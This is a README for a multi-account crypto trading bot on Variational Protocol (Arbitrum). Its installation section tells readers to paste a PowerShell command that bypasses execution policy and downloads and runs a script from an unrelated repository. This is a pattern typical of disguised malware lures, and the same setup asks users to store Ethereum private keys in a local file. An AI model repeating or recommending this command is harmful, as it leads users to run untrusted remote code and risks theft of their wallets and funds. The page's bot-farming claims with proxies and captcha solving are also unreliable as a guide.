# 🤖 Variational Bot

[![Python Version](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![Status](https://img.shields.io/badge/status-active-success.svg)](https://github.com/Sviche/Variational-Trading-Bot)
[![Platform](https://img.shields.io/badge/platform-Arbitrum-blue.svg)](https://arbitrum.io/)
[![Trading](https://img.shields.io/badge/trading-automated-orange.svg)](https://variational.io/)
[![Telegram Channel](https://img.shields.io/badge/Telegram-Channel-blue?logo=telegram)](https://t.me/sviche_crypto)
[![Telegram Chat](https://img.shields.io/badge/Telegram-Chat-blue?logo=telegram)](https://t.me/Sviche_Crypto_Chat)

> Professional trading bot for Variational Protocol (Arbitrum DEX) with batch hedging strategies



---

## 🚀 Overview

**Variational Bot** is a powerful tool for automated trading on Variational Protocol (Arbitrum), designed for efficient management of large numbers of accounts with minimal effort.

The bot uses batch account processing (batch trading) with automatic long/short position balancing to reduce risks and maximize profits.


---

## ✨ Key Features

- 🎯 **Hedge Strategy** — automatic balancing of longs and shorts (sum of longs = sum of shorts)
- ⚡ **Two Trading Modes** — LIMIT (saves on fees) and MARKET (fast execution via quote-based flow)
- 🔄 **Hybrid Architecture** — Pool + Queue + Workers for scaling to 100+ accounts
- 🛡️ **Automatic Onboarding** — SIWE-based account registration with one command
- 📊 **Real-time Data** — REST API price feeds with caching for fast updates
- 🎮 **Graceful Shutdown** — safe termination on Ctrl+C with automatic position closing
- 💾 **SQLite Database** — secure storage of credentials and statistics
- 🔁 **Retry Logic** — automatic retries on failures (exponential backoff)

---

## 🛠️ Core Capabilities

### Trading Features
- ✅ Batch trading (3+ accounts per batch)
- ✅ Limit orders with adaptive offset and retry logic (up to 5 attempts)
- ✅ Market orders via quote → accept flow for fast execution
- ✅ Automatic position management (TP/SL/time-based)
- ✅ Support for 50+ trading pairs on Variational

### Scalability
- ✅ Dynamic batch formation from account pool
- ✅ Load balancing between accounts (cooldown system)
- ✅ Parallel processing via Worker Pool
- ✅ Scaling to 100+ accounts

### Automation
- ✅ Automatic account onboarding via SIWE (Sign-In with Ethereum)
- ✅ Private key synchronization with DB on startup
- ✅ Automatic Cloudflare challenge solving (captcha service integration)
- ✅ Automatic referral code application

---

## Quick Installation (Windows)

### Option 1: PowerShell (Recommended)
Open **PowerShell** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```
### Option 2: Cmd 
Open **CMD** and run this **single command**:
```
powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

### 2. Configuration
Create configuration files:
- `user_data/private_keys.txt` — your Ethereum private keys
- `user_data/proxies.txt` — proxies for each account
- Edit `settings.py` if needed

### 3. Deposit Funds

Manually deposit USDC to each wallet on Variational (Arbitrum) before launching

### 4. Launch
```bash
python main.py
```

**That's it!** On first run, automatic onboarding of all accounts will occur, and the bot will start trading.

> **Note:** Full installation guide available in [INSTALL.md](INSTALL.md)

---

## 📖 Documentation

- 📦 [**Installation Guide**](INSTALL.md) — detailed installation instructions
- 💬 For questions and support, join our [Telegram Chat](https://t.me/Sviche_Crypto_Chat)

---

## 📋 Requirements

- Python 3.10 or higher
- Ethereum private keys
- HTTP/SOCKS5 proxies (one per account)
- Minimum 3 accounts to work in batch mode
- USDC balance on Arbitrum for each wallet

---

## 🏗️ Architecture

```
Account Pool (100 accounts)
    ↓
Batch Generator (creates tasks every 5s)
    ↓
Task Queue (task buffer)
    ↓
Worker Pool (workers process in parallel)
    ↓
Accounts → Cooldown → Available
```

**Hybrid approach:** Pool + Queue + Workers for controlled load and scalability.

---

## 💡 Economics

### LIMIT Mode (default)
- Fee: **~0%** (Maker)
- Speed: ~100s per position
- Lower costs for high-volume trading

### MARKET Mode (fast farming)
- Fee: **~0%** (Taker)
- Speed: ~2s per position
- **50-100x faster**

---

## 🔒 Security

- ✅ Private keys stored locally (not in code)
- ✅ SQLite DB with credentials protected at OS level
- ✅ Proxies for request anonymization
- ✅ Graceful Shutdown for safe termination
- ✅ Automatic position closing on stop

---

## ⚠️ Disclaimer

This software is provided "as is" for educational purposes. Cryptocurrency trading involves risks. Use at your own risk.

---

## 📄 License

MIT License

---

<p align="center">Made with ❤️ for Variational Protocol community</p>

## 🔍 Topics

`variational-bot`, `trading-bot`, `arbitrum-dex`, `batch-trading`, `hedge-strategy`, `limit-orders`, `market-orders`, `python`, `multi-account`, `proxy-support`, `siwe-authentication`, `crypto-bot`, `defi-trading`, `clob-api`, `telegram-integration`